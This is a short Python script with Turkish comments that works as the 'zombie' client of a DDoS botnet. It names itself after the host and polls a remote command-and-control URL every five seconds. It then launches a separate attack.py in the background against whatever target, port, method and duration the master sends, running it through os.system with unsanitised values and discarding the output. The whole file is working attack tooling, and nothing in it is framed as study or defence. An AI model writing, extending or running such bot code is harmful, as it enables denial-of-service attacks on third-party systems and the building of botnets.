#!/usr/bin/env python3
import os
import time
import requests

# --- AYARLAR ---
MASTER_URL = "https://shy-otters-trade.loca.lt" 
# Her zombi için varsayılan thread (kanal) sayısı (Burayı istediğin gibi değiştir)
MANUEL_THREAD = 150 
ZOMBI_AD = f"Zombi-{os.uname()[1]}"

def komut_dinle():
    print(f"🚀 {ZOMBI_AD} uyanıyor... Beyin'e bağlandı: {MASTER_URL}")
    
    while True:
        try:
            # LocalTunnel bazen tarayıcı kontrolü yaptığı için header ekliyoruz
            headers = {'Bypass-Tunnel-Reminder': 'true', 'User-Agent': 'Zombi-V1'}
            response = requests.get(f"{MASTER_URL}/get_command", headers=headers, timeout=10)
            
            if response.status_code == 200:
                data = response.json()
                
                # Panelden gelen standart veriler
                method = data.get("method")
                target = data.get("target")
                port = data.get("port")
                sure = data.get("duration")

                if method and target:
                    print(f"🔥 EMİR: {method.upper()} -> {target}:{port} | Süre: {sure}s | Thread: {MANUEL_THREAD}")
                    
                    # Panelde thread yazmasa bile attack.py'ye yukarıdaki MANUEL_THREAD'i gönderiyoruz.
                    # ./attack.py <method> <target> <port> <threads> <duration>
                    cmd = f"nohup python3 attack.py {method} {target} {port} {MANUEL_THREAD} {sure} > /dev/null 2>&1 &"
                    os.system(cmd)
                    print(f"✅ Mermiler havada!")

            time.sleep(5) # 5 saniyede bir yeni emir kontrolü
            
        except requests.exceptions.ConnectionError:
            print("⚠️ Beyin'e ulaşılamıyor, linki kontrol et kanka...")
            time.sleep(15)
        except Exception as e:
            print(f"⚠️ Hata: {e}")
            time.sleep(10)

if __name__ == "__main__":
    # Yetkileri ver ve başla
    os.system("chmod +x attack.py slave.py")
    komut_dinle()
